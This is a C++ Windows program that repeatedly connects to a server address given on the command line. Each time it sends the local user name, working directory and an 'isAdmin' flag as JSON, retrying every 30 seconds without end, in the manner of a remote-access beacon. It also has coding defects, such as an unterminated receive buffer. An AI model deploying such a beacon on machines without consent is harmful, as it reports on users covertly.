#include <iostream>
#include <string>
#include <sstream>
#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <chrono>
#include <thread>
//#include <filesystem>
#include <experimental/filesystem>

#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable:4996)

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "Usage: " << argv[0] << " <server_ip_address>" << std::endl;
        return 1;
    }

    int connectionAttempts = 0;
    while (true) {
        // Initialize Winsock
        WSADATA wsaData;
        int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (iResult != 0) {
            std::cout << "WSAStartup failed with error: " << iResult << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(30));
            ++connectionAttempts;
            continue;
        }

        // Create a TCP socket
        SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (clientSocket == INVALID_SOCKET) {
            std::cout << "socket creation failed with error: " << WSAGetLastError() << std::endl;
            WSACleanup();
            std::this_thread::sleep_for(std::chrono::seconds(30));
            ++connectionAttempts;
            continue;
        }

        // Connect to the TCP server
        struct sockaddr_in serverAddress;
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_port = htons(1000);
        InetPton(AF_INET, _T(argv[1]), &serverAddress.sin_addr.s_addr);

        iResult = connect(clientSocket, (SOCKADDR*)&serverAddress, sizeof(serverAddress));
        if (iResult == SOCKET_ERROR) {
            std::cout << "connection failed with error: " << WSAGetLastError() << std::endl;
            WSACleanup();
            Sleep(30000);
            ++connectionAttempts;
            continue;
        }

        // Send JSON data to the server
        std::stringstream jsonStream;
        jsonStream << "{";
        jsonStream << "\"filepath\":\"" << std::experimental::filesystem::current_path().string() << "\",";
        jsonStream << "\"username\":\"" << getenv("USERNAME") << "\",";
        jsonStream << "\"isAdmin\":false";
        jsonStream << "}";
        std::string jsonData = jsonStream.str();

        iResult = send(clientSocket, jsonData.c_str(), static_cast<int>(jsonData.length()), 0);
        if (iResult == SOCKET_ERROR) {
            std::cout << "send failed with error: " << WSAGetLastError() << std::endl;
            closesocket(clientSocket);
            WSACleanup();
            std::this_thread::sleep_for(std::chrono::seconds(30));
            ++connectionAttempts;
            continue;
        }

        // Receive confirmation message from the server
        char recvBuffer[512];
        iResult = recv(clientSocket, recvBuffer, sizeof(recvBuffer), 0);
        if (iResult > 0) {
            std::cout << "Received confirmation from server: " << recvBuffer << std::endl;
            closesocket(clientSocket);
        }
    }

    return 0;
}